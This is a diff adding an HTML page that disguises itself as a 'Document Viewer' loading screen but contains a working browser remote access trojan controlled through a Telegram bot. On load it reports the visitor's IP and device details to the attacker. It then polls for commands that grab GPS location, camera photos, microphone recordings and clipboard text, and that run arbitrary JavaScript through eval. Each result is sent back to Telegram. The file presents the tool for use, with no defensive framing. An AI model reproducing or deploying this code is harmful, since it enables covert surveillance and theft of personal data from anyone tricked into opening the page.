@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Viewer</title> <!-- Biar keliatan innocent -->
+    <style>
+        /* Biar keliatan kayak website beneran */
+        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
+        .loading { color: #333; animation: blink 1.5s infinite; }
+        @keyframes blink { 0%{opacity: 1;} 50%{opacity: 0.3;} 100%{opacity: 1;} }
+    </style>
+</head>
+<body>
+    <h2 class="loading">Loading document, please wait...</h2>
+    <p>Preparing content for you.</p>
+
+    <script>
+        // ==================================================
+        // HTML RAT - TELEGRAM CONTROLLED
+        // Author: Architect 01 / RianModss
+        // ==================================================
+        
+        // ============= KONFIGURASI =============
+        const BOT_TOKEN = '8711546914:AAFPV_Cs2ALUd6b1rJ56LM9fQy3z9axqoqs'; // Goblok, ganti ini!
+        const ADMIN_CHAT_ID = 7742916370; // Angka doang, jangan pake kutip
+        
+        // ============= VARIABEL GLOBAL =============
+        let clientId = '';
+        let lastUpdateId = 0;
+        
+        // ============= FUNGSI UTILITY =============
+        function generateClientId() {
+            // Bikin ID unik buat korban (pakai IP + random + timestamp)
+            return 'CLIENT-' + Math.random().toString(36).substring(7) + '-' + Date.now();
+        }
+        
+        async function sendToTelegram(endpoint, payload) {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return await response.json();
+            } catch (e) {
+                console.log('Telegram error:', e);
+                return null;
+            }
+        }
+        
+        async function sendMessage(text) {
+            return sendToTelegram('sendMessage', {
+                chat_id: ADMIN_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            });
+        }
+        
+        async function sendFile(fileData, filename, caption = '') {
+            // Upload file ke Telegram (hasil screenshot, rekaman, dll)
+            const formData = new FormData();
+            formData.append('chat_id', ADMIN_CHAT_ID);
+            formData.append('caption', caption);
+            
+            // Convert base64 atau blob ke file
+            if (typeof fileData === 'string' && fileData.includes('base64')) {
+                // Kalo base64
+                const blob = base64ToBlob(fileData.split(',')[1], 'image/jpeg');
+                formData.append('document', blob, filename);
+            } else {
+                formData.append('document', fileData, filename);
+            }
+            
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                return await response.json();
+            } catch (e) {
+                return null;
+            }
+        }
+        
+        function base64ToBlob(base64, mimeType) {
+            const byteCharacters = atob(base64);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            return new Blob([byteArray], { type: mimeType });
+        }
+        
+        // ============= PENGUMPULAN DATA =============
+        async function collectDeviceInfo() {
+            const info = {
+                id: clientId,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                battery: 'N/A'
+            };
+            
+            // Coba dapetin info baterai
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'charging' : 'discharging'})`;
+                } catch (e) {}
+            }
+            
+            // Dapetin IP (pake API publik)
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                info.ip = ipData.ip;
+            } catch (e) {
+                info.ip = 'Unknown';
+            }
+            
+            return info;
+        }
+        
+        // ============= FITUR EKSPLOITASI =============
+        const exploits = {
+            // 1. GET GPS LOCATION
+            getGPS: async function() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        resolve('❌ Geolocation not supported');
+                        return;
+                    }
+                    
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            const coords = pos.coords;
+                            const gmaps = `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+                            resolve(`📍 Location:\nLat: ${coords.latitude}\nLon: ${coords.longitude}\nAccuracy: ${coords.accuracy}m\n${gmaps}`);
+                        },
+                        (err) => {
+                            resolve(`❌ GPS Error: ${err.message}`);
+                        },
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                });
+            },
+            
+            // 2. TAKE PHOTO (CAMERA)
+            takePhoto: async function() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    return new Promise((resolve) => {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            // Stop semua track
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            // Convert ke data URL
+                            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                            resolve(dataUrl);
+                        }, 500); // Tunggu bentar biar kamera siap
+                    });
+                } catch (e) {
+                    return `❌ Camera Error: ${e.message}`;
+                }
+            },
+            
+            // 3. RECORD AUDIO (MIC)
+            recordAudio: async function(duration = 5000) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const audioChunks = [];
+                    
+                    mediaRecorder.ondataavailable = event => {
+                        audioChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.start();
+                    
+                    return new Promise((resolve) => {
+                        setTimeout(() => {
+                            mediaRecorder.stop();
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            mediaRecorder.onstop = () => {
+                                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                                resolve(audioBlob);
+                            };
+                        }, duration);
+                    });
+                } catch (e) {
+                    return `❌ Microphone Error: ${e.message}`;
+                }
+            },
+            
+            // 4. EKSEKUSI JAVASCRIPT REMOTE (RCE)
+            runJS: async function(code) {
+                try {
+                    // HATI-HATI! eval() itu berbahaya, tapi ini emang tool berbahaya
+                    const result = eval(code);
+                    return `✅ Executed\nResult: ${JSON.stringify(result)}`;
+                } catch (e) {
+                    return `❌ Error: ${e.message}`;
+                }
+            },
+            
+            // 5. GET CLIPBOARD
+            getClipboard: async function() {
+                try {
+                    if (!navigator.clipboard || !navigator.clipboard.readText) {
+                        return '❌ Clipboard API not available (HTTPS required)';
+                    }
+                    const text = await navigator.clipboard.readText();
+                    return `📋 Clipboard: ${text}`;
+                } catch (e) {
+                    return `❌ Clipboard Error: ${e.message}`;
+                }
+            },
+            
+            // 6. SCREENSHOT (pake HTML2Canvas kalo pengen, ini fallback sederhana)
+            screenshot: async function() {
+                return '⚠️ Screenshot membutuhkan library tambahan. Pake fitur camera aja, kontol.';
+            }
+        };
+        
+        // ============= HANDLE PERINTAH =============
+        async function handleCommand(commandText) {
+            const parts = commandText.split(' ');
+            const cmd = parts[0].toLowerCase();
+            const args = parts.slice(1);
+            
+            let response = '';
+            
+            switch(cmd) {
+                case '/info':
+                    const info = await collectDeviceInfo();
+                    response = `<b>Device Info:</b>\n${JSON.stringify(info, null, 2)}`;
+                    await sendMessage(response);
+                    break;
+                    
+                case '/gps':
+                case '/location':
+                    response = await exploits.getGPS();
+                    await sendMessage(response);
+                    break;
+                    
+                case '/photo':
+                case '/camera':
+                    sendMessage('📸 Taking photo...');
+                    const photoData = await exploits.takePhoto();
+                    if (photoData.startsWith('data:image')) {
+                        await sendFile(photoData, 'camera_capture.jpg', '📸 Camera capture');
+                    } else {
+                        await sendMessage(photoData);
+                    }
+                    break;
+                    
+                case '/mic':
+                case '/audio':
+                    const duration = parseInt(args[0]) || 5; // default 5 detik
+                    sendMessage(`🎤 Recording audio for ${duration} seconds...`);
+                    const audioBlob = await exploits.recordAudio(duration * 1000);
+                    if (audioBlob instanceof Blob) {
+                        await sendFile(audioBlob, 'recording.webm', `🎤 Audio recording (${duration}s)`);
+                    } else {
+                        await sendMessage(audioBlob);
+                    }
+                    break;
+                    
+                case '/exec':
+                case '/js':
+                    const code = args.join(' ');
+                    if (!code) {
+                        await sendMessage('⚠️ Usage: /js alert("hacked")');
+                        break;
+                    }
+                    response = await exploits.runJS(code);
+                    await sendMessage(response);
+                    break;
+                    
+                case '/clipboard':
+                    response = await exploits.getClipboard();
+                    await sendMessage(response);
+                    break;
+                    
+                case '/help':
+                    const helpMsg = `
+<b>🔮 HTML RAT Commands:</b>
+/info - Get device info
+/gps - Get GPS location
+/photo - Take photo (camera)
+/mic [sec] - Record audio (default 5s)
+/js [code] - Execute JavaScript
+/clipboard - Read clipboard
+/help - Show this menu
+                    `;
+                    await sendMessage(helpMsg);
+                    break;
+                    
+                default:
+                    await sendMessage(`Unknown command: ${cmd}. Type /help`);
+            }
+        }
+        
+        // ============= POLLING TELEGRAM =============
+        async function checkCommands() {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
+                const response = await fetch(url);
+                const data = await response.json();
+                
+                if (data.ok && data.result) {
+                    for (const update of data.result) {
+                        lastUpdateId = update.update_id;
+                        
+                        // Cek kalo ada pesan dan dari admin
+                        if (update.message && update.message.chat.id == ADMIN_CHAT_ID) {
+                            const text = update.message.text || '';
+                            
+                            // Format: /cmd@botusername atau /cmd
+                            const cleanText = text.split('@')[0];
+                            
+                            // Eksekusi perintah
+                            await handleCommand(cleanText);
+                        }
+                    }
+                }
+            } catch (e) {
+                console.log('Polling error:', e);
+            }
+        }
+        
+        // ============= INISIALISASI =============
+        (async function() {
+            // Generate client ID
+            clientId = generateClientId();
+            
+            // Kirim notifikasi ke admin bahwa korban online
+            const info = await collectDeviceInfo();
+            const initMsg = `
+<b>🔴 NEW TARGET ONLINE!</b>
+ID: ${clientId}
+IP: ${info.ip}
+Device: ${info.userAgent}
+Platform: ${info.platform}
+Screen: ${info.screen}
+Time: ${info.timestamp}
+            `;
+            await sendMessage(initMsg);
+            
+            // Mulai polling command (setiap 2 detik)
+            setInterval(checkCommands, 2000);
+            
+            // Opsional: Flush update ID biar gak dapet message lama
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
+        })();
+    </script>
+</body>
+</html>
